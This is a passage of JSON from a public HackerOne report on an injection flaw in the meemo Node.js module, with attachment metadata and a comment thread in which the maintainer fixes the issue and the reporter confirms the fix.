Injection"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":881598,"file_name":"poc.py","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/EBQN92w3eYQ6ejqWrmFWEMnt?response-content-disposition=attachment%3B%20filename%3D%22poc.py%22%3B%20filename%2A%3DUTF-8%27%27poc.py\u0026response-content-type=text%2Fx-python-script\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ3UNE4J5L%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070944Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCz7kjO3QyFP7jGDkA5krNaLE6O2p1tR4x0TQtjMemDwQIhALc5Qo7beEygqpMNylJrOurNEmXX%2FUaJ7i3JOGstSxsEKrQDCFcQARoMMDEzNjE5Mjc0ODQ5IgxX2Y8wmCeqyUWE5MQqkQO1SEq9Kl%2BewQlhrlfUoVvv9N1OLaMkWrWIlv8SukYusm40FYD0qUCOJT%2BzitdeP3Kr9dqa%2BJmxV7c3%2BjXo4WulUP6OrfhUn0Rcu3T1VRcH6Qpx%2FGLAa4zE5IBGMdsXZEcR335EaBEylCpdLxObdeJZ8wmT%2FiMsJqVnexQRWK0gOcg8%2BaAe0Z4MQhfL%2FVbk8%2Botr0dFlI%2FaPx8jXCrTw%2FTlRp0P9OtpSvUQA1RBVrS5L3ZNrC33bQ4md%2B9KmXmIycB047RJuvaypZW9qepGhczrUMsYabbxifZ%2FJ17yJLs39h1ENkrjIFD7f9gA%2F9u%2BsTKrtFMmGu8%2FrThH1%2FAJX2J2V%2FiXJ%2Fj2flmFEXmyNg7XqFuZ2VEFhEknqlw0sjyH5ibXryf8lYs%2FL9ye%2FbGye3G8MgjG1rQQkaNLm9nZxru2uR4y5NwW33D%2F%2F27wPuxj5YAD30GEm3l3%2BfNuoV8Y%2Fa6KBiEG2ZFNI%2Fu9t%2F7aALxmsSX49Fkt%2Fvbd%2B2ORICgPABnOO5GRZQldPJ3fh%2FPtVXm3oDDyjav%2FBTrqAWjMucnwKi73c9CZ4eV75rJ5%2B4PnghCALwGiHX4zE11a5NOtuIpj8v3a2y9AJMGR0JyOdjGEipkC8KkLqeEMFaYnCk4oCce5NwJVnhh%2F8yBh%2BJDy7WhfYG2qUirylB1Ud3rl1KSDWno%2BbVYDQgs2rcyOKmLb%2FH1USBmJPVZi3%2FK%2F%2FJ6%2BATEV10VMohl2iHY7GlXPewFvZ2tG%2FogGkzwNQUb%2BD2o7r0beeLXek5XslTtgqNCoDP9xL1i88F02X5Buj81GAIlEB1qQFUoRMd2N%2Fu0SnL64HSNiPSzstRRJidfEI6C%2F%2FcDv%2BmWfcA%3D%3D\u0026X-Amz-Signature=07848e05c61da82b18329ae77fa2f178be6d4b6d05f7ab3d5c7ada72265a522f","file_size":371,"type":"text/x-python-script"},{"id":881599,"file_name":"ldapjstestserver.js","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/xiiaQk2xRrm4WycQu3qmeqqx?response-content-disposition=attachment%3B%20filename%3D%22ldapjstestserver.js%22%3B%20filename%2A%3DUTF-8%27%27ldapjstestserver.js\u0026response-content-type=application%2Fx-perl\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ3UNE4J5L%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070944Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCz7kjO3QyFP7jGDkA5krNaLE6O2p1tR4x0TQtjMemDwQIhALc5Qo7beEygqpMNylJrOurNEmXX%2FUaJ7i3JOGstSxsEKrQDCFcQARoMMDEzNjE5Mjc0ODQ5IgxX2Y8wmCeqyUWE5MQqkQO1SEq9Kl%2BewQlhrlfUoVvv9N1OLaMkWrWIlv8SukYusm40FYD0qUCOJT%2BzitdeP3Kr9dqa%2BJmxV7c3%2BjXo4WulUP6OrfhUn0Rcu3T1VRcH6Qpx%2FGLAa4zE5IBGMdsXZEcR335EaBEylCpdLxObdeJZ8wmT%2FiMsJqVnexQRWK0gOcg8%2BaAe0Z4MQhfL%2FVbk8%2Botr0dFlI%2FaPx8jXCrTw%2FTlRp0P9OtpSvUQA1RBVrS5L3ZNrC33bQ4md%2B9KmXmIycB047RJuvaypZW9qepGhczrUMsYabbxifZ%2FJ17yJLs39h1ENkrjIFD7f9gA%2F9u%2BsTKrtFMmGu8%2FrThH1%2FAJX2J2V%2FiXJ%2Fj2flmFEXmyNg7XqFuZ2VEFhEknqlw0sjyH5ibXryf8lYs%2FL9ye%2FbGye3G8MgjG1rQQkaNLm9nZxru2uR4y5NwW33D%2F%2F27wPuxj5YAD30GEm3l3%2BfNuoV8Y%2Fa6KBiEG2ZFNI%2Fu9t%2F7aALxmsSX49Fkt%2Fvbd%2B2ORICgPABnOO5GRZQldPJ3fh%2FPtVXm3oDDyjav%2FBTrqAWjMucnwKi73c9CZ4eV75rJ5%2B4PnghCALwGiHX4zE11a5NOtuIpj8v3a2y9AJMGR0JyOdjGEipkC8KkLqeEMFaYnCk4oCce5NwJVnhh%2F8yBh%2BJDy7WhfYG2qUirylB1Ud3rl1KSDWno%2BbVYDQgs2rcyOKmLb%2FH1USBmJPVZi3%2FK%2F%2FJ6%2BATEV10VMohl2iHY7GlXPewFvZ2tG%2FogGkzwNQUb%2BD2o7r0beeLXek5XslTtgqNCoDP9xL1i88F02X5Buj81GAIlEB1qQFUoRMd2N%2Fu0SnL64HSNiPSzstRRJidfEI6C%2F%2FcDv%2BmWfcA%3D%3D\u0026X-Amz-Signature=83b9e0dfaaff13395e2bdedc14e447df43fe27efff26d5705d6d556d86fa3fdb","file_size":5346,"type":"application/x-perl"},{"id":881601,"file_name":"poc.mov","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/yXQuULnGRUoEjAvMSF36Cpm8?response-content-disposition=attachment%3B%20filename%3D%22poc.mov%22%3B%20filename%2A%3DUTF-8%27%27poc.mov\u0026response-content-type=video%2Fquicktime\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ3UNE4J5L%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070944Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCz7kjO3QyFP7jGDkA5krNaLE6O2p1tR4x0TQtjMemDwQIhALc5Qo7beEygqpMNylJrOurNEmXX%2FUaJ7i3JOGstSxsEKrQDCFcQARoMMDEzNjE5Mjc0ODQ5IgxX2Y8wmCeqyUWE5MQqkQO1SEq9Kl%2BewQlhrlfUoVvv9N1OLaMkWrWIlv8SukYusm40FYD0qUCOJT%2BzitdeP3Kr9dqa%2BJmxV7c3%2BjXo4WulUP6OrfhUn0Rcu3T1VRcH6Qpx%2FGLAa4zE5IBGMdsXZEcR335EaBEylCpdLxObdeJZ8wmT%2FiMsJqVnexQRWK0gOcg8%2BaAe0Z4MQhfL%2FVbk8%2Botr0dFlI%2FaPx8jXCrTw%2FTlRp0P9OtpSvUQA1RBVrS5L3ZNrC33bQ4md%2B9KmXmIycB047RJuvaypZW9qepGhczrUMsYabbxifZ%2FJ17yJLs39h1ENkrjIFD7f9gA%2F9u%2BsTKrtFMmGu8%2FrThH1%2FAJX2J2V%2FiXJ%2Fj2flmFEXmyNg7XqFuZ2VEFhEknqlw0sjyH5ibXryf8lYs%2FL9ye%2FbGye3G8MgjG1rQQkaNLm9nZxru2uR4y5NwW33D%2F%2F27wPuxj5YAD30GEm3l3%2BfNuoV8Y%2Fa6KBiEG2ZFNI%2Fu9t%2F7aALxmsSX49Fkt%2Fvbd%2B2ORICgPABnOO5GRZQldPJ3fh%2FPtVXm3oDDyjav%2FBTrqAWjMucnwKi73c9CZ4eV75rJ5%2B4PnghCALwGiHX4zE11a5NOtuIpj8v3a2y9AJMGR0JyOdjGEipkC8KkLqeEMFaYnCk4oCce5NwJVnhh%2F8yBh%2BJDy7WhfYG2qUirylB1Ud3rl1KSDWno%2BbVYDQgs2rcyOKmLb%2FH1USBmJPVZi3%2FK%2F%2FJ6%2BATEV10VMohl2iHY7GlXPewFvZ2tG%2FogGkzwNQUb%2BD2o7r0beeLXek5XslTtgqNCoDP9xL1i88F02X5Buj81GAIlEB1qQFUoRMd2N%2Fu0SnL64HSNiPSzstRRJidfEI6C%2F%2FcDv%2BmWfcA%3D%3D\u0026X-Amz-Signature=202a4215a8a2167fd89f1d5801b09d73ff80f86e10dfd99bcaefbabfe6601cee","file_size":47477640,"type":"video/quicktime"}],"allow_singular_disclosure_at":"2020-09-20T20:49:43.094Z","allow_singular_disclosure_after":-8590801.883465474,"singular_disclosure_allowed":true,"vote_count":1,"voters":["airim-coder"],"severity":{"rating":"critical","author_type":"User"},"structured_scope":{"databaseId":2986,"asset_type":"SOURCE_CODE","asset_identifier":"Other module","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":8429955,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi,\nI hope everyone is staying safe :)\n\nIs there any update?\n\nThank you for your patience and have a nice day,\nd3lla","markdown_message":"\u003cp\u003eHi,\u003cbr\u003e\nI hope everyone is staying safe :)\u003c/p\u003e\n\n\u003cp\u003eIs there any update?\u003c/p\u003e\n\n\u003cp\u003eThank you for your patience and have a nice day,\u003cbr\u003e\nd3lla\u003c/p\u003e\n","automated_response":false,"created_at":"2020-06-27T15:59:43.617Z","updated_at":"2020-06-27T15:59:43.617Z","actor":{"username":"d3lla","cleared":false,"url":"/d3lla","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8828305,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for reporting this @d3lla. I will do the next steps today.","markdown_message":"\u003cp\u003eThanks for reporting this \u003ca href=\"/d3lla\"\u003e@d3lla\u003c/a\u003e. I will do the next steps today.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-02T11:00:06.421Z","updated_at":"2020-08-02T11:00:06.421Z","actor":{"username":"danielruf","cleared":false,"url":"/danielruf","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/JjaMiHpqpLG3vx6VJMAA9KbK/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8951140,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","markdown_message":"","automated_response":false,"created_at":"2020-08-16T20:30:20.162Z","updated_at":"2020-08-16T20:30:20.162Z","actor":{"username":"nebulon","cleared":false,"url":"/nebulon","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/aB4HRBYPt64phWJLezBaHSBT/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8951367,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for reporting and inviting me here. I have fixed this now with https://github.com/nebulade/meemo/commit/be31ad3da7d4f8653d6813e84125bb4d25b5658b","markdown_message":"\u003cp\u003eThanks for reporting and inviting me here. I have fixed this now with \u003ca title=\"https://github.com/nebulade/meemo/commit/be31ad3da7d4f8653d6813e84125bb4d25b5658b\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fnebulade%2Fmeemo%2Fcommit%2Fbe31ad3da7d4f8653d6813e84125bb4d25b5658b\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/nebulade/meemo/commit/be31ad3da7d4f8653d6813e84125bb4d25b5658b\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-16T21:52:26.461Z","updated_at":"2020-08-16T21:52:26.461Z","actor":{"username":"nebulon","cleared":false,"url":"/nebulon","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/aB4HRBYPt64phWJLezBaHSBT/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8951654,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for providing a patch @nebulon.\n@d3lla can you confirm that this resolves the issue?","markdown_message":"\u003cp\u003eThanks for providing a patch \u003ca href=\"/nebulon\"\u003e@nebulon\u003c/a\u003e.\u003cbr\u003e\n\u003ca href=\"/d3lla\"\u003e@d3lla\u003c/a\u003e can you confirm that this resolves the issue?\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-17T00:03:44.031Z","updated_at":"2020-08-17T00:03:44.031Z","actor":{"username":"danielruf","cleared":false,"url":"/danielruf","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/JjaMiHpqpLG3vx6VJMAA9KbK/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9003466,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @nebulon and @danielruf,\n\nSorry for my late reply.\n\n@nebulon thanks for your prompt reply and for the fix.\n\nYour changes seems to fix the problem.\nI run the previous steps of the PoC and I was not able to reproduce the previous reported result.\nI attached a PoC video.\n{F958379}\n\nThank you for your time and have a nice day,\nd3lla\n\nI tested using the following configurations:\n- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS\n- NODEJS VERSION: v14.2.0\n- NPM VERSION: 6.14.4","markdown_message":"\u003cp\u003eHi \u003ca href=\"/nebulon\"\u003e@nebulon\u003c/a\u003e and \u003ca href=\"/danielruf\"\u003e@danielruf\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eSorry for my late reply.\u003c/p\u003e\n\n\u003cp\u003e\u003ca href=\"/nebulon\"\u003e@nebulon\u003c/a\u003e thanks for your prompt reply and for the fix.\u003c/p\u003e\n\n\u003cp\u003eYour changes seems to fix the problem.\u003cbr\u003e\nI run the previous steps of the PoC and I was not able to reproduce the previous reported result.\u003cbr\u003e\nI attached a PoC video.\u003cbr\u003e\n\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"fix_meemo.mov\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/8gA7hgQn1F8M1H3B6QVTpzn4?response-content-disposition=attachment%3B%20filename%3D%22fix_meemo.mov%22%3B%20filename%2A%3DUTF-8%27%27fix_meemo.mov\u0026amp;response-content-type=video%2Fquicktime\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3UNE4J5L%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070945Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCz7kjO3QyFP7jGDkA5krNaLE6O2p1tR4x0TQtjMemDwQIhALc5Qo7beEygqpMNylJrOurNEmXX%2FUaJ7i3JOGstSxsEKrQDCFcQARoMMDEzNjE5Mjc0ODQ5IgxX2Y8wmCeqyUWE5MQqkQO1SEq9Kl%2BewQlhrlfUoVvv9N1OLaMkWrWIlv8SukYusm40FYD0qUCOJT%2BzitdeP3Kr9dqa%2BJmxV7c3%2BjXo4WulUP6OrfhUn0Rcu3T1VRcH6Qpx%2FGLAa4zE5IBGMdsXZEcR335EaBEylCpdLxObdeJZ8wmT%2FiMsJqVnexQRWK0gOcg8%2BaAe0Z4MQhfL%2FVbk8%2Botr0dFlI%2FaPx8jXCrTw%2FTlRp0P9OtpSvUQA1RBVrS5L3ZNrC33bQ4md%2B9KmXmIycB047RJuvaypZW9qepGhczrUMsYabbxifZ%2FJ17yJLs39h1ENkrjIFD7f9gA%2F9u%2BsTKrtFMmGu8%2FrThH1%2FAJX2J2V%2FiXJ%2Fj2flmFEXmyNg7XqFuZ2VEFhEknqlw0sjyH5ibXryf8lYs%2FL9ye%2FbGye3G8MgjG1rQQkaNLm9nZxru2uR4y5NwW33D%2F%2F27wPuxj5YAD30GEm3l3%2BfNuoV8Y%2Fa6KBiEG2ZFNI%2Fu9t%2F7aALxmsSX49Fkt%2Fvbd%2B2ORICgPABnOO5GRZQldPJ3fh%2FPtVXm3oDDyjav%2FBTrqAWjMucnwKi73c9CZ4eV75rJ5%2B4PnghCALwGiHX4zE11a5NOtuIpj8v3a2y9AJMGR0JyOdjGEipkC8KkLqeEMFaYnCk4oCce5NwJVnhh%2F8yBh%2BJDy7WhfYG2qUirylB1Ud3rl1KSDWno%2BbVYDQgs2rcyOKmLb%2FH1USBmJPVZi3%2FK%2F%2FJ6%2BATEV10VMohl2iHY7GlXPewFvZ2tG%2FogGkzwNQUb%2BD2o7r0beeLXek5XslTtgqNCoDP9xL1i88F02X5Buj81GAIlEB1qQFUoRMd2N%2Fu0SnL64HSNiPSzstRRJidfEI6C%2F%2FcDv%2BmWfcA%3D%3D\u0026amp;X-Amz-Signature=8224a05726b1ea58f5f70a3912effbb6911dbf05162001b825826f53af1abaf2\" data-attachment-type=\"video/quicktime\"\u003e\u003cvideo controls=\"controls\" src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/8gA7hgQn1F8M1H3B6QVTpzn4?response-content-disposition=attachment%3B%20filename%3D%22fix_meemo.mov%22%3B%20filename%2A%3DUTF-8%27%27fix_meemo.mov\u0026amp;response-content-type=video%2Fquicktime\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3UNE4J5L%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070945Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCz7kjO3QyFP7jGDkA5krNaLE6O2p1tR4x0TQtjMemDwQIhALc5Qo7beEygqpMNylJrOurNEmXX%2FUaJ7i3JOGstSxsEKrQDCFcQARoMMDEzNjE5Mjc0ODQ5IgxX2Y8wmCeqyUWE5MQqkQO1SEq9Kl%2BewQlhrlfUoVvv9N1OLaMkWrWIlv8SukYusm40FYD0qUCOJT%2BzitdeP3Kr9dqa%2BJmxV7c3%2BjXo4WulUP6OrfhUn0Rcu3T1VRcH6Qpx%2FGLAa4zE5IBGMdsXZEcR335EaBEylCpdLxObdeJZ8wmT%2FiMsJqVnexQRWK0gOcg8%2BaAe0Z4MQhfL%2FVbk8%2Botr0dFlI%2FaPx8jXCrTw%2FTlRp0P9OtpSvUQA1RBVrS5L3ZNrC33bQ4md%2B9KmXmIycB047RJuvaypZW9qepGhczrUMsYabbxifZ%2FJ17yJLs39h1ENkrjIFD7f9gA%2F9u%2BsTKrtFMmGu8%2FrThH1%2FAJX2J2V%2FiXJ%2Fj2flmFEXmyNg7XqFuZ2VEFhEknqlw0sjyH5ibXryf8lYs%2FL9ye%2FbGye3G8MgjG1rQQkaNLm9nZxru2uR4y5NwW33D%2F%2F27wPuxj5YAD30GEm3l3%2BfNuoV8Y%2Fa6KBiEG2ZFNI%2Fu9t%2F7aALxmsSX49Fkt%2Fvbd%2B2ORICgPABnOO5GRZQldPJ3fh%2FPtVXm3oDDyjav%2FBTrqAWjMucnwKi73c9CZ4eV75rJ5%2B4PnghCALwGiHX4zE11a5NOtuIpj8v3a2y9AJMGR0JyOdjGEipkC8KkLqeEMFaYnCk4oCce5NwJVnhh%2F8yBh%2BJDy7WhfYG2qUirylB1Ud3rl1KSDWno%2BbVYDQgs2rcyOKmLb%2FH1USBmJPVZi3%2FK%2F%2FJ6%2BATEV10VMohl2iHY7GlXPewFvZ2tG%2FogGkzwNQUb%2BD2o7r0beeLXek5XslTtgqNCoDP9xL1i88F02X5Buj81GAIlEB1qQFUoRMd2N%2Fu0SnL64HSNiPSzstRRJidfEI6C%2F%2FcDv%2BmWfcA%3D%3D\u0026amp;X-Amz-Signature=8224a05726b1ea58f5f70a3912effbb6911dbf05162001b825826f53af1abaf2\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/video\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThank you for your time and have a nice day,\u003cbr\u003e\nd3lla\u003c/p\u003e\n\n\u003cp\u003eI tested using the following configurations:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eOPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS\u003c/li\u003e\n\u003cli\u003eNODEJS VERSION: v14.2.0\u003c/li\u003e\n\u003cli\u003eNPM VERSION: 6.14.4\u003c/li\u003e\n\u003c/ul\u003e\n","automated_response":false,"created_at":"2020-08-21T16:14:35.266Z","updated_at":"2020-08-21T16:14:35.266Z","actor":{"username":"d3lla","cleared":false,"url":"/d3lla","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":958379,"filename":"fix_meemo.mov","type":"video/quicktime","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/8gA7hgQn1F8M1H3B6QVTpzn4?response-content-disposition=attachment%3B%20filename%3D%22fix_meemo.mov%22%3B%20filename%2A%3DUTF-8%27%27fix_meemo.mov\u0026response-content-type=video%2Fquicktime\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ3UNE4J5L%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070945Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCz7kjO3QyFP7jGDkA5krNaLE6O2p1tR4x0TQtjMemDwQIhALc5Qo7beEygqpMNylJrOurNEmXX%2FUaJ7i3JOGstSxsEKrQDCFcQARoMMDEzNjE5Mjc0ODQ5IgxX2Y8wmCeqyUWE5MQqkQO1SEq9Kl%2BewQlhrlfUoVvv9N1OLaMkWrWIlv8SukYusm40FYD0qUCOJT%2BzitdeP3Kr9dqa%2BJmxV7c3%2BjXo4WulUP6OrfhUn0Rcu3T1VRcH6Qpx%2FGLAa4zE5IBGMdsXZEcR335EaBEylCpdLxObdeJZ8wmT%2FiMsJqVnexQRWK0gOcg8%2BaAe0Z4MQhfL%2FVbk8%2Botr0dFlI%2FaPx8jXCrTw%2FTlRp0P9OtpSvUQA1RBVrS5L3ZNrC33bQ4md%2B9KmXmIycB047RJuvaypZW9qepGhczrUMsYabbxifZ%2FJ17yJLs39h1ENkrjIFD7f9gA%2F9u%2BsTKrtFMmGu8%2FrThH1%2FAJX2J2V%2FiXJ%2Fj2flmFEXmyNg7XqFuZ2VEFhEknqlw0sjyH5ibXryf8lYs%2FL9ye%2FbGye3G8MgjG1rQQkaNLm9nZxru2uR4y5NwW33D%2F%2F27wPuxj5YAD30GEm3l3%2BfNuoV8Y%2Fa6KBiEG2ZFNI%2Fu9t%2F7aALxmsSX49Fkt%2Fvbd%2B2ORICgPABnOO5GRZQldPJ3fh%2FPtVXm3oDDyjav%2FBTrqAWjMucnwKi73c9CZ4eV75rJ5%2B4PnghCALwGiHX4zE11a5NOtuIpj8v3a2y9AJMGR0JyOdjGEipkC8KkLqeEMFaYnCk4oCce5NwJVnhh%2F8yBh%2BJDy7WhfYG2qUirylB1Ud3rl1KSDWno%2BbVYDQgs2rcyOKmLb%2FH1USBmJPVZi3%2FK%2F%2FJ6%2BATEV10VMohl2iHY7GlXPewFvZ2tG%2FogGkzwNQUb%2BD2o7r0beeLXek5XslTtgqNCoDP9xL1i88F02X5Buj81GAIlEB1qQFUoRMd2N%2Fu0SnL64HSNiPSzstRRJidfEI6C%2F%2FcDv%2BmWfcA%3D%3D\u0026X-Amz-Signature=8224a05726b1ea58f5f70a3912effbb6911dbf05162001b825826f53af1abaf2"}],"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9005554,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2020-08-21T20:48:18.621Z","updated_at":"2020-08-21T20:48:18.621Z","actor":{"username":"danielruf","cleared":false,"url":"/danielruf","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/JjaMiHpqpLG3vx6VJMAA9KbK/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"d3lla","url":"/d3lla"},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9005565,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-08-21T20:49:43.033Z","updated_at":"2020-08-21T20:49:43.033Z","first_to_agree":true,"actor":{"username":"danielruf","cleared":false,"url":"/danielruf","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/JjaMiHpqpLG3vx6VJMAA9KbK/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9008034,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-08-22T08:48:33.835Z","updated_at":"2020-08-22T08:48:33.835Z","actor":{"username":"d3lla","cleared":false,"url":"/d3lla","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9008035,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-08-22T08:48:33.881Z","updated_at":"2020-08-22T08:48:33.881Z","actor":{"username":"d3lla","cleared":false,"url":"/d3lla","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}